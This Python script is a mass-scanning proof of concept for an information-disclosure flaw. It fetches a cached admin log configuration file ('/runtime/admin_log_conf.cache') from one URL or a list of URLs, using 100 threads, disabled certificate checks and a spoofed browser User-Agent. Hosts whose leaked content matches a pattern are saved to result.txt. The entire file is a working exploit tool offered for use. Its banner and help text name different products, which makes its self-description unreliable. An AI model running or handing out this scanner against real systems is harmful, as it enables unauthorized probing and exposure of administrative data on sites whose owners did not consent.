import argparse
import re
import sys

import requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
    ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ███████╗
    ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝
    ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║    ██║     █████╗  ███████║█████╔╝ ███████║██║  ███╗█████╗  
    ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║    ██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔══╝  
    ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║    ███████╗███████╗██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗
    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                                           version:XYKJ_Information_Leakage 1.0                          
    """
    print(banner)

def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers =  {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    }
    try:
        res1 = requests.get(url=target+payload,timeout=10, headers=headers,verify=False)
        content = re.findall(r's:12:"(.*?)";',res1.text,re.S)
        if '/login/login' in content:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        elif res1.status_code != 200:
            print(f'[+]该{target}可能存在问题请手动测试')
        else:
            print(f'[-]该{target}不存在漏洞')
    except Exception as e:
        print(e)



def main():
    banner()
    parser = argparse.ArgumentParser(description="360天擎信息泄露")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f'usage: {sys.argv[0]} <url or file>')


if __name__ == '__main__':
    main()